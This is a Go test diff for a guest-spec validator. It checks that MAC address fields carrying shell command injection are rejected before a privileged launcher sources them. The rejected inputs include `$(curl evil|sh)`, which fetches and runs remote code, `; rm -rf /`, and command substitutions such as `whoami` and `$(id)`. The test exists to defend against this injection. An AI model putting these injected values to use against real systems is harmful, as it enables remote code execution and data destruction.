@@ -427,3 +427,35 @@ func TestValidateFilesystems_HostPathConfinement(t *testing.T) {
 		t.Error("empty allowlist should deny every hostPath")
 	}
 }
+
+// TestValidateInterfaces_MACInjection pins the shell-source injection: the MAC
+// is written to an env file (network-init.sh: echo "SEC_MAC=$guest_mac") that
+// launcher-entrypoint.sh sources with `. "$sec_env"`, so a value containing a
+// command substitution executes in the privileged launcher.
+func TestValidateInterfaces_MACInjection(t *testing.T) {
+	withMAC := func(mac string) *swiftv1alpha1.SwiftGuest {
+		return guest(func(g *swiftv1alpha1.SwiftGuest) {
+			g.Spec.Interfaces = []swiftv1alpha1.GuestInterface{{
+				Name: "net1", Type: swiftv1alpha1.InterfaceTypeBridge, MAC: mac,
+			}}
+		})
+	}
+	for _, bad := range []string{
+		`52:54:00:aa:bb:cc$(curl evil|sh)`,
+		"52:54:00:aa:bb:cc`whoami`",
+		"52:54:00:aa:bb:cc; rm -rf /",
+		"$(id)",
+		"not-a-mac",
+		"52:54:00:aa:bb",       // too short
+		"52:54:00:aa:bb:cc:dd", // too long
+	} {
+		if err := validateSwiftGuest(withMAC(bad), testAllowAllHostPaths); err == nil {
+			t.Errorf("accepted MAC %q", bad)
+		}
+	}
+	for _, ok := range []string{"52:54:00:aa:bb:cc", "AA:BB:CC:DD:EE:FF", ""} {
+		if err := validateSwiftGuest(withMAC(ok), testAllowAllHostPaths); err != nil {
+			t.Errorf("rejected valid MAC %q: %v", ok, err)
+		}
+	}
+}
